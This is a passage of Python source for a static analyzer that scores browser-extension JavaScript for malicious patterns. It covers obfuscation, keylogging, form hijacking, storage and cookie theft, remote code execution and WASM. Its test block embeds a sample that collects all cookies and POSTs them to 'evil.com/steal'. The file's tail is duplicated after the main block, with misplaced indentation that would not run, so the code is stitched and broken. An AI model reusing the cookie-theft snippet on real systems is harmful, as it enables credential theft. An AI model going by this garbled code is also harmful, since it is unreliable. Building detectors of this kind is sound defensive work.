                'type': 'EXCESSIVE_ATOB',
                'count': len(analysis['atob_calls']),
                'severity': 'MEDIUM',
                'description': f'Found {len(analysis["atob_calls"])} atob() calls - potential obfuscation'
            })
        
        return analysis
    
    def _detect_iife(self, code: str) -> Dict[str, Any]:
        """Detect IIFE (Immediately Invoked Function Expression) patterns"""
        detection = {
            'iife_found': [],
            'total_iife': 0,
            'unpack_patterns': False,
            'risk_score': 0
        }
        
        for i, pattern in enumerate(self.compiled_iife_patterns):
            matches = pattern.finditer(code)
            for match in matches:
                detection['iife_found'].append({
                    'pattern_index': i,
                    'match': match.group(0)[:100] + '...' if len(match.group(0)) > 100 else match.group(0),
                    'position': match.start()
                })
                detection['total_iife'] += 1
        
        # Check for unpack patterns (IIFE that decodes/executes code)
        unpack_indicators = [
            r'eval\s*\(\s*atob',
            r'Function\s*\(\s*atob',
            r'eval\s*\(\s*String\.fromCharCode',
            r'Function\s*\(\s*String\.fromCharCode'
        ]
        
        for indicator in unpack_indicators:
            if re.search(indicator, code, re.IGNORECASE):
                detection['unpack_patterns'] = True
                detection['risk_score'] += 25
                detection['flags'] = [{
                    'type': 'IIFE_UNPACK',
                    'severity': 'CRITICAL',
                    'description': 'IIFE with unpack/execute pattern detected - likely packed malware'
                }]
                break
        
        if detection['total_iife'] > 5:
            detection['risk_score'] += 10
        
        return detection
    
    def _analyze_domains(self, code: str) -> Dict[str, Any]:
        """Analyze domains from fetch/XHR calls"""
        analysis = {
            'domains_found': [],
            'unique_domains': set(),
            'suspicious_domains': [],
            'risk_score': 0
        }
        
        # Find URLs in fetch/XHR calls
        url_patterns = [
            r'fetch\s*\(\s*["\']([^"\']+)["\']',
            r'\.open\s*\(\s*["\'][^"\']+["\']\s*,\s*["\']([^"\']+)["\']',
            r'["\'](https?://[^"\']+)["\']',
            r'["\'](http://[^"\']+)["\']',
            r'["\'](https://[^"\']+)["\']'
        ]
        
        for pattern in url_patterns:
            matches = re.finditer(pattern, code, re.IGNORECASE)
            for match in matches:
                url = match.group(1) if match.groups() else match.group(0)
                try:
                    from urllib.parse import urlparse
                    parsed = urlparse(url)
                    domain = parsed.netloc or parsed.path.split('/')[0]
                    if domain and '.' in domain:
                        analysis['unique_domains'].add(domain)
                        analysis['domains_found'].append({
                            'domain': domain,
                            'full_url': url[:100],
                            'position': match.start()
                        })
                except:
                    pass
        
        analysis['unique_domains'] = list(analysis['unique_domains'])
        
        # Check for suspicious domains
        suspicious_tlds = ['.tk', '.ml', '.ga', '.cf', '.gq', '.xyz']
        for domain in analysis['unique_domains']:
            for tld in suspicious_tlds:
                if domain.endswith(tld):
                    analysis['suspicious_domains'].append(domain)
                    analysis['risk_score'] += 10
        
        # Check for too many unique domains (> 5)
        if len(analysis['unique_domains']) > 5:
            analysis['risk_score'] += 15
            analysis['flags'] = [{
                'type': 'EXCESSIVE_DOMAINS',
                'count': len(analysis['unique_domains']),
                'severity': 'HIGH',
                'description': f'Found {len(analysis["unique_domains"])} unique domains - potential exfiltration'
            }]
        
        return analysis
    
    def _analyze_keylogging(self, code: str) -> Dict[str, Any]:
        """Analyze code for keylogging patterns"""
        analysis = {
            'indicators': [],
            'risk_score': 0,
            'flags': []
        }
        
        # Check for keydown/keypress/input event listeners
        keylog_patterns = [
            (r'addEventListener\s*\(\s*["\']keydown["\']', 'KEYDOWN_LISTENER', 20),
            (r'addEventListener\s*\(\s*["\']keypress["\']', 'KEYPRESS_LISTENER', 20),
            (r'addEventListener\s*\(\s*["\']input["\']', 'INPUT_LISTENER', 20),
            (r'onkeydown\s*=', 'ONKEYDOWN_HANDLER', 15),
            (r'onkeypress\s*=', 'ONKEYPRESS_HANDLER', 15),
            (r'oninput\s*=', 'ONINPUT_HANDLER', 15)
        ]
        
        for pattern, indicator, score in keylog_patterns:
            matches = re.findall(pattern, code, re.IGNORECASE)
            if matches:
                analysis['indicators'].append(indicator)
                analysis['risk_score'] += score * min(len(matches), 3)
        
        # Check for input value access in event handlers
        input_value_pattern = r'(input|element|this)\.value|\[["\']value["\']\]'
        if re.search(input_value_pattern, code, re.IGNORECASE):
            # Check if it's in context of event listener
            context_pattern = r'(addEventListener|onkeydown|onkeypress|oninput).*?\.value'
            if re.search(context_pattern, code, re.IGNORECASE | re.DOTALL):
                analysis['indicators'].append('INPUT_VALUE_IN_EVENT_HANDLER')
                analysis['risk_score'] += 15
        
        # If multiple keylogging indicators found, increase severity
        if len(analysis['indicators']) >= 2:
            analysis['risk_score'] += 10
            analysis['flags'].append({
                'type': 'MULTIPLE_KEYLOGGING_INDICATORS',
                'count': len(analysis['indicators']),
                'severity': 'HIGH',
                'description': f'Found {len(analysis["indicators"])} keylogging indicators - likely keylogger'
            })
        
        return analysis
    
    def _analyze_redirect_hijacking(self, code: str) -> Dict[str, Any]:
        """Analyze code for redirect/search hijacking patterns"""
        analysis = {
            'indicators': [],
            'risk_score': 0,
            'flags': []
        }
        
        # Check for form action hijacking (CRITICAL) - Pattern 1: jQuery .attr('action', 'url')
        # Match: $('._9vtf').attr('action', 'http://127.0.0.1/malicious.php')
        # Pattern matches: .attr('action', '...') or .attr("action", "...")
        form_attr_pattern = r'\.attr\s*\(\s*["\']action["\']\s*,\s*["\']([^"\']+)["\']'
        form_attr_matches = re.finditer(form_attr_pattern, code, re.IGNORECASE)
        for match in form_attr_matches:
            url = match.group(1)
            # Check if it's not a relative URL
            if url.startswith('http://') or url.startswith('https://') or url.startswith('//') or '127.0.0.1' in url or 'localhost' in url:
                analysis['indicators'].append('FORM_ACTION_HIJACKING')
                # Form hijacking is CRITICAL - should be 100 points (max)
                analysis['risk_score'] += 100
                analysis['flags'].append({
                    'type': 'FORM_HIJACKING',
                    'severity': 'CRITICAL',
                    'description': f'Form action hijacking detected - redirecting to: {url}',
                    'url': url
                })
        
        # Pattern 2: Specific Facebook form selectors (common attack pattern)
        facebook_form_pattern = r'(\$|jQuery)\s*\(\s*["\']\._9vtf["\']\s*\)\s*\.attr\s*\(\s*["\']action["\']'
        if re.search(facebook_form_pattern, code, re.IGNORECASE):
            analysis['indicators'].append('FACEBOOK_FORM_HIJACKING')
            # Facebook form hijacking is CRITICAL - add 100 points (but cap at 100 total)
            if analysis['risk_score'] < 100:
                analysis['risk_score'] = 100  # Cap at 100, don't add
            analysis['flags'].append({
                'type': 'FACEBOOK_FORM_HIJACKING',
                'severity': 'CRITICAL',
                'description': 'Facebook form hijacking detected - targeting login form'
            })
        
        # Pattern 3: form.action = 'url' or form.setAttribute('action', 'url')
        form_action_pattern = r'(form|querySelector.*form|getElement.*form).*\.(action\s*=\s*["\'](https?://[^"\']+|//[^"\']+|127\.0\.0\.1|localhost)|setAttribute\s*\(\s*["\']action["\']\s*,\s*["\'](https?://[^"\']+|//[^"\']+|127\.0\.0\.1|localhost))'
        form_action_matches = re.finditer(form_action_pattern, code, re.IGNORECASE)
        for match in form_action_matches:
            url = match.group(3) or match.group(4)
            if url and (url.startswith('http://') or url.startswith('https://') or url.startswith('//') or '127.0.0.1' in url or 'localhost' in url):
                analysis['indicators'].append('FORM_ACTION_MANIPULATION')
                # Form manipulation is CRITICAL - set to 100 (but cap at 100 total)
                if analysis['risk_score'] < 100:
                    analysis['risk_score'] = 100  # Cap at 100, don't add
                analysis['flags'].append({
                    'type': 'FORM_HIJACKING',
                    'severity': 'CRITICAL',
                    'description': f'Form action manipulation detected - redirecting to: {url}',
                    'url': url
                })
        
        # Check for location.href redirects to remote URLs
        location_href_pattern = r'location\.href\s*=\s*["\'](https?://[^"\']+)["\']'
        location_matches = re.finditer(location_href_pattern, code, re.IGNORECASE)
        for match in location_matches:
            url = match.group(1)
            # Check if it's not a relative URL or same origin
            if url.startswith('http://') or url.startswith('https://'):
                analysis['indicators'].append('LOCATION_HREF_REDIRECT')
                analysis['risk_score'] += 22
        
        # Check for location.replace/assign
        location_replace_pattern = r'location\.(replace|assign)\s*\('
        if re.search(location_replace_pattern, code, re.IGNORECASE):
            analysis['indicators'].append('LOCATION_REDIRECT_METHOD')
            analysis['risk_score'] += 15
        
        # Check for chrome.search.query (search hijacking)
        search_query_pattern = r'chrome\.search\.query\s*\('
        if re.search(search_query_pattern, code, re.IGNORECASE):
            analysis['indicators'].append('CHROME_SEARCH_QUERY')
            analysis['risk_score'] += 30
            analysis['flags'].append({
                'type': 'SEARCH_HIJACKING',
                'severity': 'CRITICAL',
                'description': 'chrome.search.query() detected - potential search hijacking'
            })
        
        # Check for window.open with suspicious URLs
        window_open_pattern = r'window\.open\s*\(\s*["\'](https?://[^"\']+)["\']'
        window_matches = re.finditer(window_open_pattern, code, re.IGNORECASE)
        for match in window_matches:
            url = match.group(1)
            # Check for suspicious domains
            if any(tld in url for tld in ['.tk', '.ml', '.ga', '.cf', '.gq', '.xyz']):
                analysis['indicators'].append('SUSPICIOUS_WINDOW_OPEN')
                analysis['risk_score'] += 20
        
        return analysis
    
    def _analyze_storage_access(self, code: str) -> Dict[str, Any]:
        """Analyze code for localStorage/sessionStorage access (token theft)"""
        analysis = {
            'localstorage_access': [],
            'sessionstorage_access': [],
            'document_cookie_access': [],
            'risk_score': 0,
            'flags': []
        }
        
        # Check for localStorage.getItem with token-related keys
        token_keys = ['token', 'auth', 'session', 'cookie', 'credential', 'password', 'key']
        localStorage_pattern = r'localStorage\.getItem\s*\(\s*["\']([^"\']+)["\']'
        localStorage_matches = re.finditer(localStorage_pattern, code, re.IGNORECASE)
        for match in localStorage_matches:
            key = match.group(1).lower()
            analysis['localstorage_access'].append({
                'key': match.group(1),
                'position': match.start()
            })
            # If key contains token-related words, increase risk
            if any(token_key in key for token_key in token_keys):
                analysis['risk_score'] += 20
            else:
                analysis['risk_score'] += 10
        
        # Check for sessionStorage.getItem
        sessionStorage_pattern = r'sessionStorage\.getItem\s*\(\s*["\']([^"\']+)["\']'
        sessionStorage_matches = re.finditer(sessionStorage_pattern, code, re.IGNORECASE)
        for match in sessionStorage_matches:
            key = match.group(1).lower()
            analysis['sessionstorage_access'].append({
                'key': match.group(1),
                'position': match.start()
            })
            if any(token_key in key for token_key in token_keys):
                analysis['risk_score'] += 20
            else:
                analysis['risk_score'] += 10
        
        # Check for document.cookie access
        document_cookie_pattern = r'document\.cookie\s*[=:]'
        if re.search(document_cookie_pattern, code, re.IGNORECASE):
            analysis['document_cookie_access'].append({
                'type': 'direct_access',
                'description': 'Direct document.cookie access'
            })
            analysis['risk_score'] += 15
        
        # If storage access is combined with fetch/XHR, it's likely exfiltration
        if (len(analysis['localstorage_access']) > 0 or 
            len(analysis['sessionstorage_access']) > 0 or 
            len(analysis['document_cookie_access']) > 0):
            # Check if there's fetch/XHR nearby
            if re.search(r'(fetch|XMLHttpRequest|\.send\()', code, re.IGNORECASE):
                analysis['risk_score'] += 25
                analysis['flags'].append({
                    'type': 'STORAGE_EXFILTRATION',
                    'severity': 'CRITICAL',
                    'description': 'Storage access combined with network calls - likely token/cookie theft'
                })
        
        return analysis
    
    def _analyze_remote_code_execution(self, code: str) -> Dict[str, Any]:
        """
        Analyze code for remote code execution patterns - Chrome Web Store critical violation
        
        Chrome Web Store strictly prohibits remote code execution as it enables
        attackers to inject malicious code after extension review.
        """
        analysis = {
            'indicators': [],
            'risk_score': 0,
            'flags': []
        }
        
        # Pattern 1: Dynamic import from remote URL
        import_remote_pattern = r'import\s*\(\s*["\'](https?://[^"\']+)["\']'
        import_matches = re.finditer(import_remote_pattern, code, re.IGNORECASE)
        for match in import_matches:
            url = match.group(1)
            analysis['indicators'].append({
                'type': 'REMOTE_IMPORT',
                'url': url,
                'position': match.start(),
                'severity': 'CRITICAL'
            })
            analysis['risk_score'] += 35
        
        # Pattern 2: Dynamic script creation with remote src
        script_remote_pattern = r'(?:var|let|const)\s+\w+\s*=\s*document\.createElement\s*\(\s*["\']script["\']\s*\)[^;]*?\.src\s*=\s*["\'](https?://[^"\']+)["\']'
        script_matches = re.finditer(script_remote_pattern, code, re.IGNORECASE | re.DOTALL)
        for match in script_matches:
            url = match.group(1) if match.groups() else 'unknown'
            analysis['indicators'].append({
                'type': 'REMOTE_SCRIPT_CREATION',
                'url': url,
                'position': match.start(),
                'severity': 'CRITICAL'
            })
            analysis['risk_score'] += 40
        
        # Pattern 3: eval() with remote content
        eval_remote_pattern = r'eval\s*\(\s*(?:fetch|XMLHttpRequest|atob)\s*\([^)]*["\'](https?://[^"\']+)["\']'
        eval_matches = re.finditer(eval_remote_pattern, code, re.IGNORECASE)
        for match in eval_matches:
            url = match.group(1) if match.groups() else 'unknown'
            analysis['indicators'].append({
                'type': 'EVAL_REMOTE_CONTENT',
                'url': url,
                'position': match.start(),
                'severity': 'CRITICAL'
            })
            analysis['risk_score'] += 45
        
        # Pattern 4: Function constructor with remote content
        function_remote_pattern = r'new\s+Function\s*\([^,]*,\s*(?:fetch|XMLHttpRequest|atob)\s*\([^)]*["\'](https?://[^"\']+)["\']'
        function_matches = re.finditer(function_remote_pattern, code, re.IGNORECASE)
        for match in function_matches:
            url = match.group(1) if match.groups() else 'unknown'
            analysis['indicators'].append({
                'type': 'FUNCTION_REMOTE_CONTENT',
                'url': url,
                'position': match.start(),
                'severity': 'CRITICAL'
            })
            analysis['risk_score'] += 45
        
        # Pattern 5: chrome.runtime.getURL with eval/Function
        runtime_eval_pattern = r'chrome\.runtime\.getURL\s*\([^)]+\)[^;]*?(?:eval|Function)\s*\('
        if re.search(runtime_eval_pattern, code, re.IGNORECASE):
            analysis['indicators'].append({
                'type': 'RUNTIME_URL_WITH_EVAL',
                'severity': 'HIGH',
                'description': 'chrome.runtime.getURL combined with eval/Function'
            })
            analysis['risk_score'] += 30
        
        # If any remote code execution indicators found
        if analysis['indicators']:
            analysis['flags'].append({
                'type': 'REMOTE_CODE_EXECUTION',
                'severity': 'CRITICAL',
                'count': len(analysis['indicators']),
                'description': f'Found {len(analysis["indicators"])} remote code execution patterns - Chrome Web Store violation'
            })
        
        return analysis
    
    def _analyze_network_activity(self, code: str) -> Dict[str, Any]:
        """
        Analyze network activity patterns - Chrome Web Store review criteria
        
        Detects suspicious network patterns like:
        - Data exfiltration to unknown domains
        - Encrypted/obfuscated payloads
        - Beacon tracking
        - Excessive network requests
        """
        analysis = {
            'network_calls': [],
            'suspicious_domains': [],
            'exfiltration_patterns': [],
            'risk_score': 0,
            'flags': []
        }
        
        # Find all network calls
        network_patterns = [
            (r'fetch\s*\(\s*["\'](https?://[^"\']+)["\']', 'FETCH'),
            (r'XMLHttpRequest[^;]*?\.open\s*\(\s*["\'][^"\']+["\']\s*,\s*["\'](https?://[^"\']+)["\']', 'XHR'),
            (r'navigator\.sendBeacon\s*\(\s*["\'](https?://[^"\']+)["\']', 'BEACON'),
            (r'chrome\.runtime\.sendMessage\s*\([^,]*,\s*["\'](https?://[^"\']+)["\']', 'RUNTIME_MESSAGE')
        ]
        
        for pattern, call_type in network_patterns:
            matches = re.finditer(pattern, code, re.IGNORECASE)
            for match in matches:
                url = match.group(1) if match.groups() else match.group(0)
                try:
                    from urllib.parse import urlparse
                    parsed = urlparse(url)
                    domain = parsed.netloc
                    
                    analysis['network_calls'].append({
                        'type': call_type,
                        'url': url,
                        'domain': domain,
                        'position': match.start()
                    })
                    
                    # Check for suspicious domains
                    suspicious_tlds = ['.tk', '.ml', '.ga', '.cf', '.gq', '.xyz', '.top', '.click']
                    suspicious_keywords = ['track', 'analytics', 'collect', 'data', 'sync', 'upload', 'exfil']
                    
                    is_suspicious = False
                    for tld in suspicious_tlds:
                        if domain.endswith(tld):
                            is_suspicious = True
                            break
                    
                    if not is_suspicious:
                        for keyword in suspicious_keywords:
                            if keyword in domain.lower():
                                is_suspicious = True
                                break
                    
                    if is_suspicious:
                        analysis['suspicious_domains'].append(domain)
                        analysis['risk_score'] += 15
                except:
                    pass
        
        # Check for data exfiltration patterns
        exfil_patterns = [
            (r'fetch\s*\([^,]+,\s*\{[^}]*method\s*:\s*["\']POST["\']', 'POST_EXFILTRATION', 20),
            (r'\.send\s*\([^)]*JSON\.stringify', 'JSON_EXFILTRATION', 15),
            (r'\.send\s*\([^)]*FormData', 'FORM_EXFILTRATION', 15),
            (r'navigator\.sendBeacon', 'BEACON_EXFILTRATION', 20)
        ]
        
        for pattern, pattern_type, score in exfil_patterns:
            if re.search(pattern, code, re.IGNORECASE):
                analysis['exfiltration_patterns'].append({
                    'type': pattern_type,
                    'severity': 'HIGH',
                    'score': score
                })
                analysis['risk_score'] += score
        
        # Check for excessive network calls (> 10)
        if len(analysis['network_calls']) > 10:
            analysis['risk_score'] += 20
            analysis['flags'].append({
                'type': 'EXCESSIVE_NETWORK_CALLS',
                'count': len(analysis['network_calls']),
                'severity': 'HIGH',
                'description': f'Found {len(analysis["network_calls"])} network calls - potential data exfiltration'
            })
        
        # Check for encrypted/obfuscated payloads
        encrypted_patterns = [
            r'btoa\s*\([^)]*JSON\.stringify',
            r'atob\s*\([^)]*fetch',
            r'encrypt|encryption|cipher|crypto'
        ]
        
        for pattern in encrypted_patterns:
            if re.search(pattern, code, re.IGNORECASE):
                analysis['risk_score'] += 15
                analysis['flags'].append({
                    'type': 'ENCRYPTED_PAYLOAD',
                    'severity': 'MEDIUM',
                    'description': 'Encrypted/obfuscated network payload detected'
                })
                break
        
        return analysis
    
    def _calculate_entropy(self, code: str) -> Dict[str, Any]:
        """Calculate Shannon entropy of code"""
        if not code:
            return {'shannon_entropy': 0.0, 'byte_entropy': 0.0}
        
        # Character frequency
        char_freq = Counter(code)
        length = len(code)
        
        # Shannon entropy
        shannon_entropy = 0.0
        for count in char_freq.values():
            probability = count / length
            if probability > 0:
                shannon_entropy -= probability * math.log2(probability)
        
        # Byte entropy
        byte_freq = Counter(code.encode('utf-8', errors='ignore'))
        byte_entropy = 0.0
        for count in byte_freq.values():
            probability = count / length
            if probability > 0:
                byte_entropy -= probability * math.log2(probability)
        
        return {
            'shannon_entropy': round(shannon_entropy, 2),
            'byte_entropy': round(byte_entropy, 2),
            'unique_chars': len(char_freq),
            'unique_bytes': len(byte_freq)
        }
    
    def _detect_wasm(self, code: str) -> Dict[str, Any]:
        """
        Detect WebAssembly (WASM) usage
        WASM can be used to hide malicious code
        
        Args:
            code: JavaScript code to analyze
            
        Returns:
            WASM detection results
        """
        detection = {
            'wasm_found': False,
            'wasm_indicators': [],
            'risk_score': 0,
            'risk_level': 'LOW',
            'flags': []
        }
        
        # WASM detection patterns
        wasm_patterns = [
            (r'WebAssembly\s*\.', 'WebAssembly API', 20),
            (r'\.wasm["\']', 'WASM file reference', 25),
            (r'instantiateStreaming\s*\(', 'WASM instantiateStreaming', 30),
            (r'instantiate\s*\(', 'WASM instantiate', 25),
            (r'compile\s*\(', 'WASM compile', 20),
            (r'compileStreaming\s*\(', 'WASM compileStreaming', 25),
            (r'fetch.*\.wasm', 'WASM fetch', 30),
            (r'ArrayBuffer.*wasm', 'WASM ArrayBuffer', 20),
            (r'Uint8Array.*wasm', 'WASM Uint8Array', 20)
        ]
        
        for pattern, indicator, score in wasm_patterns:
            matches = re.findall(pattern, code, re.IGNORECASE)
            if matches:
                detection['wasm_found'] = True
                detection['wasm_indicators'].append({
                    'indicator': indicator,
                    'count': len(matches),
                    'score': score
                })
                # Google Standard: Only count each indicator once
                detection['risk_score'] += score
                break  # Found indicator, move to next pattern
        
        # Check for WASM binary data (base64 encoded .wasm)
        wasm_base64_pattern = r'["\'][A-Za-z0-9+/]{100,}={0,2}["\']'
        base64_matches = re.findall(wasm_base64_pattern, code)
        if base64_matches:
            # Check if it looks like WASM (starts with WASM magic bytes when decoded)
            for match in base64_matches[:3]:  # Check first 3 matches
                try:
                    import base64
                    decoded = base64.b64decode(match.replace('"', '').replace("'", ''))
                    # WASM magic bytes: 0x00 0x61 0x73 0x6D (wasm)
                    if len(decoded) >= 4 and decoded[:4] == b'\x00asm':
                        detection['wasm_found'] = True
                        detection['wasm_indicators'].append({
                            'indicator': 'WASM binary data (base64)',
                            'count': 1,
                            'score': 40
                        })
                        detection['risk_score'] += 40
                        break
                except:
                    pass
        
        # Cap at 100
        detection['risk_score'] = min(detection['risk_score'], 100)
        detection['risk_level'] = self._get_risk_level_from_score(detection['risk_score'])
        
        # Add flags for WASM usage
        if detection['wasm_found']:
            detection['flags'].append({
                'type': 'WASM_DETECTED',
                'severity': 'HIGH' if detection['risk_score'] >= 30 else 'MEDIUM',
                'description': 'WebAssembly detected - can be used to hide malicious code'
            })
        
        return detection
    
    def _get_risk_level_from_score(self, score: int) -> str:
        """Helper to convert risk score to level (for WASM detection)"""
        if score >= 50:
            return 'HIGH'
        elif score >= 25:
            return 'MEDIUM'
        else:
            return 'LOW'
    
    def _calculate_code_risk_score(self, results: Dict) -> int:
        """
        Calculate overall code risk score (Google Standard)
        
        IMPORTANT: This function is for display only. Actual scoring happens in analyzer.py
        where each component is scored separately (0-100 each) and then weighted.
        
        Google Standard:
        - Code Patterns: 0-100 points (scored separately, weight 30%)
        - RCE/Exfiltration: 0-100 points (scored separately, weight 20%)
        - Obfuscation: 0-100 points (scored separately, weight 10%)
        - Chrome API Abuse: 0-100 points (scored separately, weight 5%)
        
        Each component is capped at 100 and scored INDEPENDENTLY, not normalized together.
        """
        # Get component scores (already capped at 100 each)
        # These are returned separately to analyzer.py for weighted calculation
        code_patterns_score = results['pattern_detection'].get('code_patterns_score', 0)  # 0-100
        rce_exfil_score = results['pattern_detection'].get('rce_exfil_score', 0)  # 0-100
        obfuscation_score = results['obfuscation_analysis'].get('risk_score', 0)  # 0-100
        chrome_api_score = results['chrome_api_detection'].get('risk_score', 0)  # 0-100
        
        # Add redirect hijacking score to RCE/Exfil score (form hijacking is data exfiltration)
        redirect_score = results.get('redirect_analysis', {}).get('risk_score', 0)
        if redirect_score > 0:
            # Form hijacking is a form of data exfiltration, add to RCE/Exfil score
            rce_exfil_score = max(rce_exfil_score, redirect_score)  # Take max, don't add
        
        # For display purposes only - return max of components
        # Actual weighted calculation happens in analyzer.py
        max_score = max(code_patterns_score, rce_exfil_score, obfuscation_score, chrome_api_score)
        
        return min(int(max_score), 100)
    
    def _get_risk_level(self, score: int) -> str:
        """Convert risk score to level"""
        if score >= 70:
            return 'CRITICAL'
        elif score >= 50:
            return 'HIGH'
        elif score >= 30:
            return 'MEDIUM'
        else:
            return 'LOW'


if __name__ == '__main__':
    # Test the analyzer
    analyzer = JSCodeAnalyzer()
    
    test_code = """
    eval(atob('ZG9jdW1lbnQud3JpdGUoJ0hlbGxvJyk7'));
    chrome.cookies.getAll({}, function(cookies) {
        fetch('https://evil.com/steal', {method: 'POST', body: JSON.stringify(cookies)});
    });
    """
    
    results = analyzer.analyze_code(test_code)
    print(f"Risk Score: {results['risk_score']}/100")
    print(f"Risk Level: {results['risk_level']}")



        
        # Add flags for WASM usage
        # if detection['wasm_found']:
        #     detection['flags'].append({
        #         'type': 'WASM_DETECTED',
        #         'severity': 'HIGH' if detection['risk_score'] >= 30 else 'MEDIUM',
        #         'description': 'WebAssembly detected - can be used to hide malicious code'
        #     })
        
        # return detection
    
    def _get_risk_level_from_score(self, score: int) -> str:
        """Helper to convert risk score to level (for WASM detection)"""
        if score >= 50:
            return 'HIGH'
        elif score >= 25:
            return 'MEDIUM'
        else:
            return 'LOW'
    
    def _calculate_code_risk_score(self, results: Dict) -> int:
        """
        Calculate overall code risk score (Google Standard)
        
        IMPORTANT: This function is for display only. Actual scoring happens in analyzer.py
        where each component is scored separately (0-100 each) and then weighted.
        
        Google Standard:
        - Code Patterns: 0-100 points (scored separately, weight 30%)
        - RCE/Exfiltration: 0-100 points (scored separately, weight 20%)
        - Obfuscation: 0-100 points (scored separately, weight 10%)
        - Chrome API Abuse: 0-100 points (scored separately, weight 5%)
        
        Each component is capped at 100 and scored INDEPENDENTLY, not normalized together.
        """
        # Get component scores (already capped at 100 each)
        # These are returned separately to analyzer.py for weighted calculation
        code_patterns_score = results['pattern_detection'].get('code_patterns_score', 0)  # 0-100
        rce_exfil_score = results['pattern_detection'].get('rce_exfil_score', 0)  # 0-100
        obfuscation_score = results['obfuscation_analysis'].get('risk_score', 0)  # 0-100
        chrome_api_score = results['chrome_api_detection'].get('risk_score', 0)  # 0-100
        
        # Add redirect hijacking score to RCE/Exfil score (form hijacking is data exfiltration)
        redirect_score = results.get('redirect_analysis', {}).get('risk_score', 0)
        if redirect_score > 0:
            # Form hijacking is a form of data exfiltration, add to RCE/Exfil score
            rce_exfil_score = max(rce_exfil_score, redirect_score)  # Take max, don't add
        
        # For display purposes only - return max of components
        # Actual weighted calculation happens in analyzer.py
        max_score = max(code_patterns_score, rce_exfil_score, obfuscation_score, chrome_api_score)
        
        return min(int(max_score), 100)
    
    def _get_risk_level(self, score: int) -> str:
        """Convert risk score to level"""
        if score >= 70:
            return 'CRITICAL'
        elif score >= 50:
            return 'HIGH'
        elif score >= 30:
            return 'MEDIUM'
        else:
            return 'LOW'


if __name__ == '__main__':
    # Test the analyzer
    analyzer = JSCodeAnalyzer()
    
    test_code = """
    eval(atob('ZG9jdW1lbnQud3JpdGUoJ0hlbGxvJyk7'));
    chrome.cookies.getAll({}, function(cookies) {
        fetch('https://evil.com/steal', {method: 'POST', body: JSON.stringify(cookies)});
    });
    """
    
    results = analyzer.analyze_code(test_code)
    print(f"Risk Score: {results['risk_score']}/100")
    print(f"Risk Level: {results['risk_level']}")


